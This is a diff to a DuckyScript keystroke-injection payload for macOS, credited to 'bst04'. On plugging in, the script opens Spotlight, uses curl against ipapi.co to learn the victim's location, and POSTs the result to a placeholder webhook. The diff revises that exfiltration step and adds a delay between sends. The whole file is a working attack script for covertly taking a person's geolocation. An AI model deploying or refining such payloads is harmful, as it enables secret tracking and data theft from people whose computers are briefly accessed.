@@ -1,3 +1,5 @@
+REM Payload Made By bst04
+REM For MacOS
 DELAY 500
 GUI SPACE
 DELAY 500
@@ -7,8 +9,6 @@ DELAY 1000
 STRING location=$(curl -s https://ipapi.co/json/)
 ENTER
 DELAY 1000
-STRING json=\'{\"content\": \"${location}\"}\'
+STRING curl -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-urlencode "content=$location" https://yourwebhook
 ENTER
-DELAY 500
-STRING curl -X POST -H "Content-Type: application/json" -d ${json} "webhook"
-ENTER
+DELAY 30000  # Espera 30 segundos antes de permitir otro envío
